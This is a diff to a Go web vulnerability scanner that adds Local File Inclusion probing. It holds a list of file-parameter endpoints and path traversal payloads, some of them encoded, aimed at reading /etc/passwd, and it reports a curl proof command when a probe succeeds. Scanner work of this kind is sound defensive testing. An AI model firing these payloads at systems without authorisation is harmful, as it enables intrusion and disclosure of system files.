@@ -68,6 +68,34 @@ var protectedPaths = []string{
 	"/actuator",
 }
 
+// lfiPaths are endpoints that commonly accept file parameters.
+var lfiPaths = []struct {
+	path   string
+	params []string
+}{
+	{"/", []string{"file", "path", "page", "template", "include", "doc", "load"}},
+	{"/view", []string{"file", "path", "page", "name"}},
+	{"/read", []string{"file", "path", "name"}},
+	{"/download", []string{"file", "path", "name"}},
+	{"/include", []string{"file", "path", "page"}},
+	{"/template", []string{"file", "name", "path"}},
+	{"/api/file", []string{"path", "name"}},
+	{"/api/read", []string{"file", "path"}},
+	{"/api/download", []string{"file", "path"}},
+	{"/static", []string{"file", "path"}},
+	{"/assets", []string{"file", "path"}},
+	{"/render", []string{"file", "template", "path"}},
+}
+
+// lfiPayloads are path traversal payloads for parameter-based LFI.
+var lfiPayloads = []string{
+	"../../../../../../etc/passwd",
+	"....//....//....//....//etc/passwd",
+	"..%2f..%2f..%2f..%2fetc%2fpasswd",
+	"..%252f..%252f..%252fetc%252fpasswd",
+	"/etc/passwd",
+}
+
 // sensitiveTargets — if traversal reaches these, it confirms the bypass.
 // All lowercase because they are compared against strings.ToLower(body).
 var sensitiveTargets = []string{
@@ -221,6 +249,74 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 				findings = append(findings, exploitFindings...)
 			}
 		}
+	}
+
+	// Parameter-based Local File Inclusion (LFI) probing.
+	// Tests endpoints that accept file/path parameters for traversal.
+	for _, lfi := range lfiPaths {
+		if ctx.Err() != nil {
+			break
+		}
+		lfiURL := base + lfi.path
+		// Skip paths that 404.
+		checkReq, err := http.NewRequestWithContext(ctx, http.MethodGet, lfiURL+"?"+lfi.params[0]+"=test", nil)
+		if err != nil {
+			continue
+		}
+		checkResp, err := client.Do(checkReq)
+		if err != nil {
+			continue
+		}
+		_, _ = io.Copy(io.Discard, checkResp.Body)
+		_ = checkResp.Body.Close()
+		if checkResp.StatusCode == 404 {
+			continue
+		}
+
+		for _, param := range lfi.params {
+			for _, payload := range lfiPayloads {
+				if ctx.Err() != nil {
+					break
+				}
+				tryURL := fmt.Sprintf("%s%s?%s=%s", base, lfi.path, param, payload)
+				req, err := http.NewRequestWithContext(ctx, http.MethodGet, tryURL, nil)
+				if err != nil {
+					continue
+				}
+				resp, err := client.Do(req)
+				if err != nil {
+					continue
+				}
+				body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+				_ = resp.Body.Close()
+				bodyStr := strings.ToLower(string(body))
+
+				if resp.StatusCode == 200 && strings.Contains(bodyStr, "root:") {
+					findings = append(findings, finding.Finding{
+						CheckID:     finding.CheckWebPathTraversal,
+						Module:      "deep",
+						Scanner:     scannerName,
+						Severity:    finding.SeverityHigh,
+						Asset:       asset,
+						Title:       fmt.Sprintf("Local File Inclusion via %s parameter on %s%s", param, asset, lfi.path),
+						Description: fmt.Sprintf("The %s parameter on %s is vulnerable to path traversal. The payload '%s' successfully read /etc/passwd.", param, tryURL, payload),
+						DeepOnly:    true,
+						ProofCommand: fmt.Sprintf(`curl -s "%s"`, tryURL),
+						Evidence: map[string]any{
+							"url":       tryURL,
+							"path":      lfi.path,
+							"parameter": param,
+							"payload":   payload,
+							"method":    "parameter-lfi",
+						},
+						Confidence:   finding.ConfidenceVerified,
+						DiscoveredAt: time.Now(),
+					})
+					goto nextLFIPath // one finding per path is enough
+				}
+			}
+		}
+	nextLFIPath:
 	}
 
 	return findings, nil
